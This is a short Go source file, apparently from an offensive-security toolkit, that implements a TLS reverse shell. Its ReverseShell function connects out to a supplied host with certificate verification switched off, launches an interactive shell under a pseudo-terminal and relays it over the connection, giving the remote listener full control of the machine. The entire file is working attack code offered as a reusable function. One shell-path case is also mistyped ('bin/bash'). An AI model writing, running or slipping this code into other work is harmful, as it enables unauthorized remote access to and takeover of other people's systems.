package tacos

import (
	"crypto/tls"
	"io"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"syscall"

	"github.com/ariary/go-utils/pkg/logger"
	"github.com/creack/pty"
	"golang.org/x/term"
)

//DefaultShell: return the default shell
func DefaultShell() string {
	//Determine default shell
	//macOS
	//dscl . -read ~/ UserShell
	//linux
	//grep ^$(id -un): /etc/passwd | cut -d : -f 7-
	return "/bin/bash"
}

//ReverseShell: spawn a reverse shell with pty targeting host (ip:port)
func ReverseShell(host string, shell string) {
	logger.AddFilenameAndLinePrefix(log.Default())
	conf := &tls.Config{
		InsecureSkipVerify: true,
	}
	conn, err := tls.Dial("tcp", host, conf)
	if err != nil {
		panic(err)
	}

	var args []string
	switch shell {
	case "bin/bash":
		args = append(args, "-li")
	case "/bin/sh", "/bin/zsh", "/bin/csh", "/bin/tcsh":
		args = append(args, "-i")
	}
	cmd := exec.Command(shell, args...)

	// Start the command with a pty.
	ptmx, err := pty.Start(cmd)
	if err != nil {
		log.Fatal(err)
	}
	// Make sure to close the pty at the end.
	defer func() { _ = ptmx.Close() }() // Best effort.

	// Handle pty size.
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGWINCH)
	go func() {
		for range ch {
			if err := pty.InheritSize(os.Stdin, ptmx); err != nil {
				log.Printf("error resizing pty: %s", err)
			}
		}
	}()
	ch <- syscall.SIGWINCH                        // Initial resize.
	defer func() { signal.Stop(ch); close(ch) }() // Cleanup signals when done.

	// Set stdin in raw mode.
	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		panic(err)
	}
	defer func() { _ = term.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort.

	// Copy socket stdin to the pty and the pty to socket stdout.
	go func() { _, _ = io.Copy(ptmx, conn) }()
	_, _ = io.Copy(conn, ptmx)

	conn.Close()
}
